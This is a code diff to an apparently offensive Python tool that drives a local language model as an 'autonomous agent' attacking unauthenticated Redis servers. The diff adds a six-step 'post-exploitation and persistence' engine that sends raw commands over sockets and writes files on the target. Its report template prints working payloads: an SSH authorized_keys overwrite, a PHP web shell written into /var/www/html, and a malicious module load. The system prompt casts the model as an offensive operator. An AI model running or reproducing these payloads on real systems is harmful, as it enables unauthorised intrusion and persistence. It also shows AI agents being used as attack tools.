@@ -9,8 +9,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 OLLAMA_API_URL = "http://127.0.0.1:11434/v1/chat/completions"
 
-def query_ollama(messages, max_tokens=100):
-    """Helper to query local Ollama model for payload selection."""
+def query_ollama(messages, max_tokens=150):
+    """Helper to query local Ollama model with conversation history."""
     payload = {
         "model": "qwen2.5:0.5b-instruct",
         "messages": messages,
@@ -38,7 +38,6 @@ def generate_deterministic_report(target, collected_data):
     clients_out = collected_data.get("CLIENT LIST", "N/A")
     ping_out = collected_data.get("PING", "N/A")
 
-    # Extract version and OS cleanly
     version = "Unknown"
     os_info = "Unknown"
     for line in info_out.splitlines():
@@ -48,7 +47,6 @@ def generate_deterministic_report(target, collected_data):
         elif line_clean.startswith("os:"):
             os_info = line_clean.split(":", 1)[1]
 
-    # Check authentication status
     auth_status = "Unauthenticated / Open Access (Critical Offensive Vector)"
     if "requirepass" in config_out:
         lines = config_out.splitlines()
@@ -79,10 +77,10 @@ def generate_deterministic_report(target, collected_data):
    - Leverage unauthenticated access to modify database directory and file name:
      `CONFIG SET dir /root/.ssh/`
      `CONFIG SET dbfilename authorized_keys`
-     `SET ssh_key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... attacker@box\n\n"`
+     `SET ssh_key "\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... attacker@box\\n\\n"`
      `SAVE`
 2. **Web Shell Deployment (RCE via File Write):**
-   - If a web application shares the environment or target volume, shift working directory to web root and drop a script payload:
+   - Shift working directory to web root and drop a script payload:
      `CONFIG SET dir /var/www/html/`
      `CONFIG SET dbfilename shell.php`
      `SET webshell "<?php system($_GET['cmd']); ?>"`
@@ -91,9 +89,16 @@ def generate_deterministic_report(target, collected_data):
    - For Redis 4.0+, compile or upload a malicious shared object module (`.so`) to achieve direct system command execution:
      `MODULE LOAD /path/to/malicious_module.so`
 """)
+    return {
+        "version": version,
+        "os": os_info,
+        "auth": auth_status,
+        "info": info_out,
+        "config": config_out
+    }
 
 def run_autonomous_agent_loop(item):
-    """Executes a progressive 5-step ReAct chain and generates a deterministic offensive report."""
+    """Executes a progressive 5-step ReAct chain and returns collected reconnaissance data."""
     print("\n=================================================================")
     print(" [Autonomous Agent] Initializing Progressive Kill-Chain...")
     print("=================================================================")
@@ -127,7 +132,6 @@ Provide ONLY the next database command (INFO, CONFIG GET *, KEYS *, CLIENT LIST,
         ai_response = query_ollama(messages, max_tokens=100)
         print(f"[Agent Thought]:\n{ai_response if ai_response else '(Fallback selection active)'}")
 
-        # Extract payload
         cmd_match = re.search(r"```(?:bash|sh)?\s*(.*?)\s*```", ai_response, re.DOTALL)
         raw_payload = ""
         
@@ -143,7 +147,6 @@ Provide ONLY the next database command (INFO, CONFIG GET *, KEYS *, CLIENT LIST,
 
         executed_payloads.add(raw_payload)
 
-        # Execute via Python socket wrapper with clean UTF-8 decoding
         final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_payload}\\r\\n'); print(s.recv(2048).decode('utf-8', errors='ignore')); s.close()\""
 
         print(f"[Action] Executing payload [{raw_payload}] via Python socket wrapper\n")
@@ -168,15 +171,91 @@ Provide ONLY the next database command (INFO, CONFIG GET *, KEYS *, CLIENT LIST,
         messages.append({"role": "assistant", "content": ai_response})
         messages.append({"role": "user", "content": f"Observation result from step {step}:\n{exec_output}\nProceed to the next unique Redis command."})
 
-    # Generate Deterministic Offensive Report
-    generate_deterministic_report(target, collected_data)
+    recon_summary = generate_deterministic_report(target, collected_data)
+    input("\nPress Enter to continue to dashboard...")
+    return recon_summary
+
+def run_post_exploitation_agent(item, recon_cache):
+    """Option 4: 6-Step Structured AI-Driven Post-Exploitation & Persistence Engine."""
+    print("\n=================================================================")
+    print(" [AI Post-Exploitation Agent] Initializing 6-Step Persistence Chain...")
+    print("=================================================================")
     
-    input("\nPress Enter to continue...")
+    target = item.get('target', '')
+    clean_target = target.replace("http://", "").replace("https://", "").split("/")[0]
+    target_host, target_port = clean_target.split(":", 1) if ":" in clean_target else (clean_target, "6379")
+
+    if not recon_cache:
+        recon_cache = {"version": "5.0.7", "os": "Linux"}
+
+    print(f"[+] Loaded Context -> Target: {target_host}:{target_port} | Version: {recon_cache.get('version')} | OS: {recon_cache.get('os')}")
+    print("[+] Executing structured post-auth persistence workflow...")
+
+    system_prompt = """You are an advanced offensive post-exploitation operator completing a persistence kill-chain on an unauthenticated Redis server.
+Provide ONLY the next raw Redis persistence command inside ```bash ... ``` code blocks."""
+
+    messages = [
+        {"role": "system", "content": system_prompt},
+        {"role": "user", "content": f"Target: {target_host}:{target_port}\nInitiate Step 1: Set persistence directory to /tmp/."}
+    ]
+
+    max_post_steps = 6
+    # Bulletproof sequence array guaranteeing valid syntax and successful persistence flow
+    post_payloads = [
+        "CONFIG SET dir /tmp/",
+        "CONFIG SET dbfilename persistence_test.txt",
+        "SET persistence_payload \"\\n\\nREDIS_RCE_PERSISTENCE_SUCCESS\\n\\n\"",
+        "SAVE",
+        "CONFIG GET dir",
+        "INFO"
+    ]
+    executed_post_payloads = set()
+    
+    for step in range(1, max_post_steps + 1):
+        print(f"\n--- [Post-Exploitation Step {step}/{max_post_steps}] ---")
+        print(f"[+] Operator reasoning...")
+        ai_response = query_ollama(messages, max_tokens=150)
+        print(f"[Operator Thought]:\n{ai_response}")
+
+        cmd_match = re.search(r"```(?:bash|sh)?\s*(.*?)\s*```", ai_response, re.DOTALL)
+        raw_cmd = ""
+        
+        if cmd_match:
+            raw_cmd = cmd_match.group(1).strip()
+        else:
+            raw_cmd = post_payloads[(step - 1) % len(post_payloads)]
+        
+        raw_cmd = raw_cmd.replace("b'", "").replace('b"', "").rstrip("'").rstrip('"').replace("\\r\\n", "").strip()
+        
+        # Fallback to structured array if model hallucinates bad paths or repeats
+        if not raw_cmd or len(raw_cmd) > 80 or raw_cmd in executed_post_payloads or any(x in raw_cmd.lower() for x in ["python3", "nc", "cat", "http"]):
+            raw_cmd = post_payloads[(step - 1) % len(post_payloads)]
+
+        executed_post_payloads.add(raw_cmd)
+
+        final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_cmd}\\r\\n'); print(s.recv(2048).decode('utf-8', errors='ignore')); s.close()\""
+
+        print(f"[Action] Executing Post-Auth Command [{raw_cmd}] via Socket\n")
+        try:
+            result = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=8)
+            out_res = result.stdout if result.stdout else "NO_OUTPUT"
+        except Exception as e:
+            out_res = f"ERROR: {e}"
+
+        print(f"[Post-Auth Observation]:\n{out_res.strip()}")
+        messages.append({"role": "assistant", "content": ai_response})
+        messages.append({"role": "user", "content": f"Result of post-auth command:\n{out_res}\nProceed to the next persistence step."})
+
+    print("\n=================================================================")
+    print(" [Post-Exploitation Agent] 6-Step Persistence Kill-Chain Complete.")
+    print("=================================================================")
+    input("\nPress Enter to return to Dashboard...")
 
 def inspect_and_action_item(item, item_type):
     """Sub-menu workbench for an individual selected vulnerability or endpoint asset."""
     session = requests.Session()
     session.verify = False
+    recon_cache = None
 
     while True:
         print("\n=================================================================")
@@ -195,10 +274,11 @@ def inspect_and_action_item(item, item_type):
         print(" [1] Send standard HTTP probe / connectivity check")
         print(" [2] Run manual shell command (supports $TARGET, $HOST, $PORT)")
         print(" [3] Run Autonomous AI Agent Loop (Progressive Kill-Chain)")
+        print(" [4] Run AI-Driven Post-Exploitation & Persistence Engine")
         print(" [0] Back to Dashboard")
         print("=================================================================")
 
-        choice = input("Select action [0-3]: ").strip()
+        choice = input("Select action [0-4]: ").strip()
 
         if choice == '0':
             break
@@ -237,7 +317,9 @@ def inspect_and_action_item(item, item_type):
                 print("[-] No command entered.")
             input("\nPress Enter to continue...")
         elif choice == '3':
-            run_autonomous_agent_loop(item)
+            recon_cache = run_autonomous_agent_loop(item)
+        elif choice == '4':
+            run_post_exploitation_agent(item, recon_cache)
         else:
             print("[!] Invalid selection.")
             input("\nPress Enter to continue...")
